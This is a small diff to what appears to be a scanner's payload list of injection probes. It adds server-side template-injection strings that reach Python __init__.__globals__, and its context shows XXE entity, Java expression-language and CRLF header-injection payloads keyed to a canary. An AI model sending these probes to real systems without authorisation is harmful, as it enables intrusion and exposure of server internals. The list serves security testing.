@@ -29,7 +29,8 @@ null
 undefined
 {canary}()
 ${class.getResource("").getPath()}
-__init__.__globals__["{module}"].config
+__init__.__globals__["sys"].config
+__init__.__globals__.keys()
 <?xml version="1.0" encoding="utf-8?>
 <!DOCTYPE xxe [<!ENTITY foo "{canary}">]><root>&foo;</root>
 %0d%0a%0d%0aheader: {canary}
